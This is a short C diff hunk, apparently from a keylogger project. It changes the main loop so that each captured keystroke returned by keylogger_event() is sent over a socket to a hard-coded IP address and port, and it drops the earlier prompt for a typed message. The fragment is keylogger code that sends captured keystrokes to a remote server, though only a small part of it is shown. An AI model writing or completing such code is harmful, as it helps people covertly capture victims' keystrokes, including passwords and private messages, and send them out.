@@ -40,8 +40,9 @@ void app()
     serv.sin_port = htons(PORT);
     serv.sin_addr.s_addr = inet_addr(IP);
 
-    printf("Enter message : ");
-    scanf("%s", client_message);
     while (1)
-        send_message(sock, serv, keylogger_event());
+    {
+        char *key = keylogger_event();
+        send_message(sock, serv, key);
+    }
 }
